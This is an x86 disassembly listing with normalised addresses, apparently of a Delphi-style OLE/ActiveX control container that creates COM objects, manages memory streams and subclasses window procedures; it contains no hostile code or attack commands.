mov eax [ eax + 0x21c ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
call sub_4611a0
mov eax [ ebp - 0x4 ]
call sub_464df8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
push eax
mov eax [ eax ]
call [ eax + 0x20 ]
call sub_4611a0
jmp r-xdata
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
call sub_4613ac
mov eax [ ebp - 0x4 ]
add eax 0x238
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x210 ]
test ecx ecx
je r-xdata
sub ecx 0xfffffdb4
mov eax [ ebp - 0x4 ]
add eax 0x220
call sub_405928
push eax
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
push eax
mov eax [ eax ]
call [ eax ]
call sub_4611a0
mov eax [ ebp - 0x4 ]
add eax 0x224
call sub_405928
push eax
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
push eax
mov eax [ eax ]
call [ eax ]
call sub_4611a0
mov eax [ ebp - 0x4 ]
add eax 0x228
call sub_405928
push eax
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
push eax
mov eax [ eax ]
call [ eax ]
mov eax [ ebp - 0x4 ]
add eax 0x234
push eax
mov ecx [ ebp - 0x4 ]
test ecx ecx
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
lea edx [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
call sub_4613ac
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
test [ eax + 0x2c ] 0x1
je r-xdata
sub ecx 0xfffffff8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
test [ eax + 0x2c ] 0x8
je r-xdata
push 0xfffffe0b
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0xdc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
test [ eax + 0x2c ] 0x4
je r-xdata
push 0xfffffdfe
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0xdc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
test [ eax + 0x2c ] 0x2
je r-xdata
push 0xfffffe00
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0xdc ]
push 0xffffffff
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
push eax
call sub_46660c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
push 0xfffffdff
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0xdc ]
sub_4648e0
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
mov ebx edx
cmp eax 0x80040112
jne r-xdata
call sub_4611a0
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_403238
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b814
call sub_403a74
sub_464938
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_464a52
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
push ebp
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405dec
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
add eax 0x218
call sub_405928
push eax
push r-xdata
push 0x5
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
push eax
call CoCreateInstance
pop edx
call sub_4648e0
pop ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
cmp [ eax + 0x28 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
call sub_405928
push eax
push r-xdata
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
push eax
call CoGetClassObject
call sub_4611a0
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x208 ]
mov edx [ edx + 0x28 ]
call sub_404828
push ebp
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405dec
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
add eax 0x218
call sub_405928
push eax
mov eax [ ebp - 0xc ]
push eax
push r-xdata
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x1c ]
pop edx
call sub_4648e0
pop ecx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464a59
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_40405c
lea eax [ ebp - 0xc ]
call sub_404718
lea eax [ ebp - 0x8 ]
call sub_405928
retn
sub_464a80
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_464b42
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_464df8
push 0x0
push 0x2
call GlobalAlloc
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x214 ] ebx
test ebx ebx
jne r-xdata
xor eax eax
push ebp
push sub_464b15
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
call sub_405928
push eax
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
push eax
call CreateStreamOnHGlobal
call sub_4611a0
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
call sub_4611a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_40b7cc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464b49
lea eax [ ebp - 0x8 ]
call sub_405928
retn
sub_464b50
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_4645f0
test [ ebx + 0x23d ] 0x4
jne r-xdata
mov eax ebx
call sub_443450
mov edx esp
mov eax ebx
call sub_43f650
push esp
mov eax ebx
call sub_4462cc
push eax
push 0x0
mov eax ebx
test eax eax
je r-xdata
push eax
push 0x0
push 0xfffffffb
mov eax [ ebx + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0x2c ]
cmp [ ebx + 0x22c ] 0x0
jne r-xdata
sub eax 0xfffffd9c
mov eax ebx
call sub_4651bc
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b894
call sub_403a74
add esp 0x10
pop ebx
retn
mov eax ebx
call sub_4464d0
push eax
call IsWindowVisible
test eax eax
je r-xdata
push 0x0
mov eax ebx
call sub_4464d0
push eax
call ShowWindow
jmp r-xdata
sub_464bf4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor edx edx
push ebp
push sub_464c75
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax ebx
call sub_4467d4
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_444010
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ esi ]
cmp eax 0xbc00
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
test [ ebx + 0x23e ] 0x1
jne r-xdata
cmp eax 0xc000
jae r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_4464d0
push eax
mov eax [ ebx + 0x174 ]
push eax
call CallWindowProcA
mov [ esi + 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub [ esi ] 0x9c00
sub_464c84
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
setne al
pop esi
pop ebx
retn
sub_464cac
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_4038b4#2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4437d8
mov eax [ ebp - 0x4 ]
push eax
push sub_4655cc
mov eax [ ebp - 0x4 ]
push eax
push sub_466004
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x0
setne cl
mov edx r-xdata
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_464d50
push ebx
mov ebx eax
lea ecx [ ebx + 0x238 ]
mov eax [ ebx + 0x208 ]
lea edx [ eax + 0x10 ]
mov eax [ ebx + 0x218 ]
call sub_461458
lea ecx [ ebx + 0x234 ]
mov edx r-xdata
mov eax [ ebx + 0x218 ]
call sub_461458
lea eax [ ebx + 0x228 ]
call sub_405928
lea eax [ ebx + 0x224 ]
call sub_405928
lea eax [ ebx + 0x220 ]
call sub_405928
pop ebx
retn
sub_464db8
push ebx
push esi
push edi
mov ebx [ eax + 0x208 ]
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x4c ]
call sub_4032e8
xor eax eax
mov [ ebx + 0x4c ] eax
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x4c ]
call sub_417570
call sub_4032e8
inc edi
dec esi
jne r-xdata
sub_464e18
push ebx
mov ebx eax
test [ ebx + 0x23d ] 0x4
jne r-xdata
mov eax ebx
call sub_44388c
pop ebx
retn
mov eax [ ebx + 0x174 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x180 ]
push eax
call SetWindowLongA
cmp [ ebx + 0x218 ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0x180 ] eax
pop ebx
retn
push 0x1
mov eax [ ebx + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
sub_464e90
push ebx
push esi
push edi
push ecx
mov ebx eax
mov ecx [ ebx + 0x208 ]
mov edi [ ecx + 0x20 ]
mov esi [ ecx + 0x24 ]
xor eax eax
jmp r-xdata
cmp eax edi
jne r-xdata
cmp edx [ esi + eax * 4 ]
je r-xdata
xor eax eax
xor edx edx
jmp r-xdata
push eax
cmp [ ecx + 0x30 ] 0x191
jb r-xdata
inc eax
pop ecx
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx ]
call sub_403274
call sub_4032b0
add eax 0x7
and eax 0xfffffff8
mov eax [ ecx + 0x50 ]
test eax eax
jne r-xdata
add ebx eax
pop eax
mov edx [ ebx + eax * 8 + 0x4 ]
mov eax [ ebx + eax * 8 ]
sub_464f24
push ebx
push esi
xor esi esi
call sub_456c04
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov edx [ rw-data ]
mov esi [ eax + 0x248 ]
mov esi [ ebx + 0x248 ]
jmp r-xdata
sub_464f88
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_465036
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ edi + 0x240 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46503d
lea eax [ ebp - 0x10 ]
call sub_405928
lea eax [ ebp - 0xc ]
call sub_405928
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ edi + 0x240 ]
mov edx ebx
call sub_417570
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ edi + 0x208 ]
mov eax [ eax + 0x38 ]
mov eax [ eax + ebx * 4 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_464ef0
mov edx [ ebp - 0x10 ]
lea eax [ ebp - 0xc ]
mov ecx r-xdata
call sub_40596c
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4625f0
sub_465058
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov eax esi
call sub_40edb8
mov ecx esi
mov edx edi
mov eax ebx
call sub_465078
pop edi
pop esi
pop ebx
retn
sub_465078
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
lea eax [ ebp - 0x20 ]
mov edx [ r-xdata ]
call sub_4049a4
xor eax eax
push ebp
push sub_4650fa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4645f0
mov [ esi ] 0x0
push 0x0
lea eax [ ebp - 0x20 ]
push eax
push esi
push rw-data
push 0x2
push 0x0
mov eax [ rw-data ]
push eax
push edi
mov eax [ ebx + 0x224 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465101
lea eax [ ebp - 0x20 ]
mov edx [ r-xdata ]
call sub_404a74
retn
lea edx [ ebp - 0x20 ]
call sub_461cec
sub_46511c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46516a
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax ebx
call sub_465178
lea edx [ ebp - 0x10 ]
mov eax edi
call sub_4120a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465171
lea eax [ ebp - 0x10 ]
call sub_40edcc
retn
sub_465178
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_465058
pop edi
pop esi
pop ebx
retn
sub_465190
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov edi edx
mov ebx eax
mov eax esi
call sub_404718
mov ecx esp
mov edx edi
mov eax ebx
call sub_465078
mov eax [ esp + 0x8 ]
mov [ esi ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_4651bc
push ebx
push esi
push ecx
mov ebx eax
cmp [ ebx + 0x22c ] 0x0
je r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
xor eax eax
mov [ esp ] eax
push esp
mov eax [ ebx + 0x22c ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
cmp [ esp ] 0x0
jne r-xdata
mov esi [ esp ]
mov [ ebx + 0x180 ] esi
push 0xfffffffc
push esi
call GetWindowLongA
mov [ ebx + 0x174 ] eax
mov eax [ rw-data ]
mov [ eax ] ebx
push r-xdata
push 0xfffffffc
mov eax [ ebx + 0x180 ]
push eax
call SetWindowLongA
push 0x0
push 0x0
push 0x0
mov eax [ ebx + 0x180 ]
push eax
call SendMessageA
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b894
call sub_403a74
sub_46524c
push ebx
push esi
push ebp
mov ebp esp
mov ebx eax
mov edx [ ebx + 0xc ]
test edx edx
je r-xdata
mov edx [ ebx + 0x8 ]
mov eax [ ebx + 0x4 ]
call [ ebx ]
mov esp ebp
pop ebp
pop esi
pop ebx
retn
xor eax eax
lea esi [ ebx + 0x10 ]
push [ esi + 0x8 ]
je r-xdata
mov al [ esi ]
cmp al 0x1
ja r-xdata
push [ esi + 0x4 ]
test ah ah
jne r-xdata
mov ecx [ esi + 0x4 ]
mov ah 0x1
jmp r-xdata
add esi 0xc
dec edx
jne r-xdata
sub_46528c
push ebp
mov ebp esp
add esp 0xfffffd64
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] eax
lea ecx [ ebp - 0x29c ]
mov eax [ ebp - 0x4 ]
call sub_464e90
cmp [ ebp - 0x29c ] 0x10000
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
mov [ ebp - 0xc ] eax
xor ecx ecx
push ebp
push j_sub_403788#4
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov edx [ ebx + 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x294 ] eax
mov eax edx
mov [ ebp - 0x290 ] eax
test edx edx
je r-xdata
lea eax [ ebp - 0x29c ]
call sub_46524c
mov ebx [ ebp - 0xc ]
test ebx ebx
je r-xdata
add eax eax
mov edx [ ebx ]
lea eax [ edx + eax * 8 ]
mov ebx eax
lea esi [ ebp - 0x28c ]
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec ebx
lea esi [ ebp + ebx * 8 - 0x10c ]
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx eax
sub edx 0x4
je r-xdata
mov [ esi ] 0x0
mov edx [ ebp - 0xc ]
lea edi [ ebp + edx * 8 - 0x10c ]
xor edx edx
mov [ edi ] edx
test ah 0x40
je r-xdata
mov ebx [ ebp - 0xc ]
test ebx ebx
je r-xdata
test ebx ebx
jne r-xdata
mov eax [ esi ]
call sub_404e34
mov edx [ esi + 0x4 ]
mov [ edx ] eax
mov [ esi ] 0x1
mov eax [ ebx + 0x8 ]
mov [ esi + 0x4 ] eax
jmp r-xdata
dec edx
sub edx 0x3
jb r-xdata
mov edx edi
mov eax [ ebx + 0x8 ]
call sub_404e10
xor eax eax
mov [ edi + 0x4 ] eax
mov eax [ edi ]
mov [ esi + 0x4 ] eax
mov edx edi
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_404e10
mov eax [ ebx + 0x8 ]
mov [ edi + 0x4 ] eax
mov [ esi + 0x4 ] edi
jmp r-xdata
dec ebx
lea eax [ ebp + ebx * 8 - 0x10c ]
call sub_404038
test ebx ebx
jne r-xdata
add esi 0xc
inc [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x290 ]
jne r-xdata
mov [ esi ] 0x2
mov eax [ ebx + 0x8 ]
mov [ esi + 0x4 ] eax
mov eax [ ebx + 0xc ]
mov [ esi + 0x8 ] eax
jmp r-xdata
dec edx
je r-xdata
inc [ ebp - 0xc ]
jmp r-xdata
sub ebx 0x10
mov eax [ ebx ]
and eax 0xffff
mov edx eax
and edx 0xfff
cmp edx 0x8
jne r-xdata
mov [ esi ] 0x0
mov [ esi + 0x4 ] ebx
jmp r-xdata
jmp r-xdata
mov [ esi ] 0x0
test ah 0x20
je r-xdata
mov eax [ ebx + 0x8 ]
mov [ esi + 0x4 ] eax
mov [ esi + 0x4 ] ebx
jmp r-xdata
sub_46542c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x208 ]
cmp [ eax + 0x30 ] 0x12c
jge r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_464e90
cmp [ ebp - 0x10 ] 0x10000
jl r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_46528c
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
push ebp
push sub_4654e9
push [ fs : eax ]
mov [ fs : eax ] esp
push ebx
push esi
mov esi [ ebp - 0x4 ]
mov ebx [ esi + 0x8 ]
test ebx ebx
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call [ ebp - 0x10 ]
pop esi
pop ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov esi [ esi ]
mov eax ebx
shl eax 0x4
xor edx edx
add esi eax
cmp ax 0x7
ja r-xdata
je r-xdata
test dl dl
jne r-xdata
push [ esi + 0xc ]
push [ esi + 0x8 ]
test eax 0x2000
je r-xdata
mov ecx esi
inc dl
test eax 0x2000
jne r-xdata
sub esi 0x10
mov eax [ esi ]
cmp ax 0x4
ja r-xdata
push esi
jmp r-xdata
dec ebx
jne r-xdata
mov ecx [ esi + 0x8 ]
jmp r-xdata
sub_465510
push ebx
push esi
push ecx
mov [ esp ] dl
mov esi eax
xor ebx ebx
mov eax esi
call sub_4467d4
and al [ esp ]
je r-xdata
test bl bl
jne r-xdata
push 0x0
push 0x0
push 0x30f
mov eax esi
call sub_4464d0
push eax
mov eax [ esi + 0x174 ]
push eax
call CallWindowProcA
test eax eax
setne bl
mov eax ebx
pop edx
pop esi
pop ebx
retn
mov dl [ esp ]
mov eax esi
call sub_445760
mov ebx eax
sub_465560
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov ebx [ esi + 0x244 ]
test ebx ebx
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
mov eax [ ebx + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov ebx eax
xor edi edi
inc edi
dec ebx
jne r-xdata
mov eax ebp
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov edx edi
mov eax [ esi + 0x244 ]
call sub_417570
cmp ebp eax
jne r-xdata
mov edx [ esi + 0x208 ]
mov edx [ edx + 0x40 ]
mov edx [ edx + edi * 4 ]
mov ecx eax
mov eax esi
call sub_465a0c
jmp r-xdata
sub_4655cc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_464df8
xor eax eax
push ebp
push sub_46566e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
push eax
push 0x2
call GlobalAlloc
mov esi eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x214 ] esi
test esi esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
push eax
call GlobalLock
mov esi eax
xor eax eax
push ebp
push sub_46565d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465664
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
push eax
call GlobalUnlock
retn
call sub_40b7cc
sub_465688
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebp + 0xc ]
mov eax [ ebx + 0x48 ]
cmp esi eax
je r-xdata
mov edx [ ebx + 0x4c ]
cmp edx [ ebp + 0x8 ]
je r-xdata
test eax eax
jg r-xdata
push esi
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_445e84
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test edx edx
jle r-xdata
test [ ebx + 0x23d ] 0x4
jne r-xdata
mov esi [ ebx + 0x48 ]
mov eax [ ebx + 0x4c ]
mov [ ebp + 0x8 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x40 ]
push eax
push 0x9ec
mov eax [ ebp + 0x8 ]
push eax
call MulDiv
push eax
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x40 ]
push eax
push 0x9ec
push esi
call MulDiv
lea ecx [ ebp - 0x10 ]
pop edx
call sub_416114
lea eax [ ebp - 0x10 ]
push eax
push 0x1
mov eax [ ebx + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0x44 ]
test eax eax
je r-xdata
sub_465740
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x10 ] 0x5
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x4 ] ecx
lea ecx [ ebp - 0x10 ]
call sub_465afc
mov esp ebp
pop ebp
retn 0x8
sub_465798
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46583e
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ ebx + 0x8 ]
call sub_4040d0
mov edx esi
mov eax ebx
call sub_43fa98
cmp [ ebx + 0x220 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465845
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40405c
retn
push 0xfffffd42
mov eax [ ebx + 0x220 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
mov eax [ ebx + 0x208 ]
mov eax [ eax + 0x2c ]
test al 0x30
je r-xdata
test al 0x10
je r-xdata
mov edi 0xfffffdfb
mov edi 0xfffffdfa
jmp r-xdata
mov ecx esi
mov edx edi
mov eax ebx
call sub_465bd0
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax ebx
call sub_46511c
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_404444
jne r-xdata
sub_465878
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_465914
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ edi + 0x240 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46591b
lea eax [ ebp - 0x10 ]
call sub_405928
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ edi + 0x240 ]
mov edx ebx
call sub_417570
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0xc ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ edi + 0x208 ]
mov eax [ eax + 0x38 ]
mov eax [ eax + ebx * 4 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_4625a0
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_465768
sub_46592c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4659fc
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43fb84
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465a03
lea eax [ ebp - 0x8 ]
call sub_405928
retn
xor eax eax
push ebp
push j_sub_403788#3
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
call sub_405928
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
test ebx ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
call sub_4611a0
sub eax 0xfffffd9c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x220 ] 0x0
je r-xdata
push 0xffffffff
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
sub_465996
or ebx 0xffffffff
call sub_403af0
test ebx ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
push eax
